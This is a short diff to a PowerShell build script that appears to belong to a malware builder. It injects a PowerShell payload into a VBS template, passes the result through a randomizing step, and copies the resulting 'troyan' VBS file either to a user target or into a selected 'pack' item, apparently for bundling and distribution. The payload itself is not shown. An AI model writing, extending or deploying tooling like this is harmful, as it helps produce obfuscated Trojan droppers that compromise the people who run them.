@@ -1,5 +1,5 @@
 param (
-    [string]$serverName
+    [string]$serverName, [string]$packId = ""
 )
 
 if ([string]::IsNullOrEmpty($serverName)) {
@@ -63,6 +63,16 @@ $holder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "holder.vbs")
 $result = $holder
 $result = $result -replace '0102', $holderPs
 
+$outputFile = $server.userTroyanVbs  
+ 
+if ([string]::IsNullOrEmpty($packId) -eq $false) {
+    $pack = $server.pack.items | Where-Object { $_.index -eq $packId }
+    if (-not $pack) {
+        throw "Item with index '$packId' not found in pack items."
+    }
+    $outputFile= $pack.packFileVbs
+}   
+
 $result | Set-Content $server.troyanVbsDebug
 & (Join-Path -Path $scriptDir -ChildPath "randomer.ps1") -inputFile $server.troyanVbsDebug -outputFile $server.troyanVbsRelease -fileType vbs
-Copy-Item -Path $server.troyanVbsRelease -Destination $server.userTroyanVbs -Force
+Copy-Item -Path $server.troyanVbsRelease -Destination $outputFile -Force
